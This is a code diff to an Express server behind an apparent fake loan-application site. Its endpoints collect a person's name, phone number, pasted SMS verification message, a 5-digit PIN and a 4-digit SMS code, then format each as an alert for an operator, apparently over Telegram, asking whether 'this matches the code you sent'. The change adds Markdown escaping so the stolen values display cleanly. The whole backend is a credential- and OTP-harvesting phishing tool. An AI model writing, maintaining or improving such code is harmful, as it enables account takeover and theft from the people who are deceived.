@@ -80,13 +80,13 @@ app.post('/api/verify-code', async function (req, res) {
 
     firstCodes[referenceId] = d.code;
 
-    var message =
+        var message =
         '🔑 *Loan Application Code Received*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '👤 ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
-        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
         '\n💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
-        '\n📩 *Full SMS Message Pasted:*\n`' + (d.code || '-') + '`\n' +
+        '\n📩 *Full SMS Message Pasted:*\n`' + escapeMd(d.code || '-') + '`\n' +
         '\n🕐 ' + new Date().toLocaleString() + '\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '✅ Confirm if this matches the code you sent.';
@@ -117,16 +117,27 @@ app.post('/api/verify-code', async function (req, res) {
     }
 });
 
+// Escape special Markdown characters so copy blocks never break
+function escapeMd(str) {
+    if (str === null || str === undefined) return '-';
+    return String(str)
+        .replace(/\\/g, '\\\\')
+        .replace(/`/g, '\\`')
+        .replace(/\*/g, '\\*')
+        .replace(/_/g, '\\_')
+        .replace(/\[/g, '\\[');
+}
+
 // ============================================================
 // 3) RESEND CODE (SHORT)
 // ============================================================
 app.post('/api/resend-code', async function (req, res) {
     var d = req.body;
 
-    var message =
+        var message =
         '🔄 *Resend Requested*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
         '\n🕐 ' + new Date().toLocaleString();
 
     try {
@@ -235,11 +246,11 @@ app.post('/api/telegram-callback', async function (req, res) {
 app.post('/api/final-code', async function (req, res) {
     var d = req.body;
 
-    var message =
+        var message =
         '🎯 *5-Digit PIN Submitted*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
-        '\n🔑 *5-Digit PIN:*\n`' + (d.finalCode || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
+        '\n🔑 *5-Digit PIN:*\n`' + escapeMd(d.finalCode || '-') + '`\n' +
         '\n🕐 ' + new Date().toLocaleString();
 
     try {
@@ -272,7 +283,7 @@ app.post('/api/last-code', async function (req, res) {
     var message =
         '🔐 *4-Digit SMS Code Received*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
         '\n🔑 *4-Digit Code:*\n`' + (d.lastCode || '-') + '`\n' +
         '\n🕐 ' + new Date().toLocaleString();
 
